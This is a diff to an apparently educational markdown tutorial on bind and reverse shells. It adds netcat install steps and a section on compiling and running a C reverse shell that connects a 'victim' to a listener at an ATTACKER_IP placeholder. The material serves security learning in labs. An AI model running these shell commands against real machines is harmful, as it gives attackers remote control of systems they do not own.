@@ -18,6 +18,80 @@ There are two ways to access a shell (bind shell and reverse shell)
 
 **The Bind shell** is rarely used in practice, due to firewalls that restricts imbound connection . dynamic IP addresses etc . In the case of a bind shell you make a connection to the user , that means the user has to be waiting (listening ) for connection and you connect to it. for this to work you will need the IP address of the system and the port you want to make connection to . note: once the IP address changes there is no way for you to access the system unless ofcourse you find its new IP
 
+## Using Netcat for a bind shell 
+First we need to install netcat.
+
+### 🔌 Installing Netcat (`nc`) on Android, Windows, and Linux
+
+Netcat (often abbreviated as `nc`) is a powerful network tool used for reading from and writing to network connections using TCP or UDP.
+
+---
+
+### 📱 Android
+
+#### Option 1: Using Termux (Recommended)
+1. Install [**Termux**](https://f-droid.org/en/packages/com.termux/) from F-Droid.
+2. Run the following commands in Termux:
+   ```bash
+   pkg update
+   pkg install netcat-openbsd
+   
+✅ Netcat will be installed as nc.
+
+####  Option 2: Using BusyBox (Root Required)
+1. Install BusyBox from Play Store or F-Droid.
+
+2. Open a terminal emulator or ADB shell:
+
+   ```bash
+   busybox nc
+
+
+### 🪟 Windows
+
+#### Option 1: Using Nmap's Ncat
+1. Download and install Nmap from https://nmap.org/download.html.
+> **⚠️ Disclaimer:** Always verify the authenticity and integrity of files downloaded from external sources. Downloading and running binaries from the internet can pose security risks. Only use trusted sites and scan files for malware before execution.
+
+2. Use Ncat (a Netcat-compatible tool) from the command line:
+   ```powershell
+   ncat.exe -l -p 4444
+   
+### Option 2: Standalone Netcat Binary
+> **⚠️ Disclaimer:** Always verify the authenticity and integrity of files downloaded from external sources. Downloading and running binaries from the internet can pose security risks. Only use trusted sites and scan files for malware before execution.
+1. Download from a trusted source like https://eternallybored.org/misc/netcat/
+2. Extract and run from Command Prompt:
+   ```cmd
+   nc.exe -l -p 4444
+   
+### 🐧 Linux
+1. Debian/Ubuntu-based:
+   ```bash
+   sudo apt update
+   sudo apt install netcat-openbsd
+2. Arch-based:
+   ```bash
+    sudo pacman -S gnu-netcat
+
+3. RHEL/CentOS/Fedora:
+
+   ```bash
+   sudo dnf install nmap-ncat
+#### ✅ Verify Installation
+1. Run one of the following commands:
+   ```bash
+   nc --version
+#### or
+2.
+   ```bash
+    ncat --version
+
+#### ℹ️ Note: Depending on your OS and install method, the command may be nc, netcat, or ncat.
+
+    
+    Feel free to open an issue or PR if you encounter platform-specific differences!
+
+
   ## Using Netcat for a bind shell
      Attacker's Host: nc <IP> <port> # makes connection to remote machine (looks for machine with that IP and has that port opened and makes a connection to it)
      Remote Machine: nc -nvlp <IP> # listens for connection (waits for someone to connect to its machine through that port)
@@ -101,3 +175,36 @@ Sends connection request to Socket and connects if open (returns 0); fails other
 
 
 https://www.geeksforgeeks.org/socket-programming-cc/
+
+## C reverse shell
+### how to compile, run and use the shell.c file for reverse shell
+ > ⚠️ For educational/lab use only. Only test on your own machines or safe environments like TryHackMe or HackTheBox.
+1. Compile the Code
+On Linux:
+    ```bash
+       gcc -o shell shell.c
+    ``` 
+2. Set Up the Listener on Attacker Machine
+On a separate machine or terminal, run:
+
+    ```bash
+    nc -lvnp 4444
+    ```
+Replace 4444 with your chosen port
+
+3. Run the Reverse Shell on Victim (or your test machine)
+    ```bash
+    ./shell <ATTACKER_IP> 4444
+    ```
+    Example:
+    ```bash
+    ./shell 192.168.1.10 4444
+    ```
+    If successful, your listener terminal gets a shell:
+
+    ```bash
+    whoami
+    pwd
+    ```
+
+
